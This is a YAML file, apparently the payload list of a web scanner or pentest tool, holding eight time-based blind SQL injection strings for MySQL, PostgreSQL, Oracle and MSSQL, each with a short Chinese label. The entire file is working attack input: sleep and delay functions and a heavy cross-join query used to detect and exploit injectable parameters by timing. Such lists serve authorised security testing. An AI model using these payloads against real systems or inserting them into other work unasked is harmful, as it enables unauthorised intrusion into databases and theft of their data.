sqli:
  time_based:
  - payload: 1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
    description: MySQL 时间盲注
  - payload: 1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)#
    description: 'MySQL 时间盲注 # 注释'
  - payload: 1' AND pg_sleep(5)--
    description: PostgreSQL 时间盲注
  - payload: 1' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
    description: PostgreSQL 条件时间盲注
  - payload: 1' AND dbms_pipe.receive_message(('a'),5)--
    description: Oracle 时间盲注
  - payload: 1' WAITFOR DELAY '0:0:5'--
    description: MSSQL 时间盲注
  - payload: 1' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1, sysusers AS sys2, sysusers
      AS sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7,
      sysusers AS sys8)--
    description: MSSQL 重查询盲注
  - payload: 1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1
    description: MySQL 双条件盲注
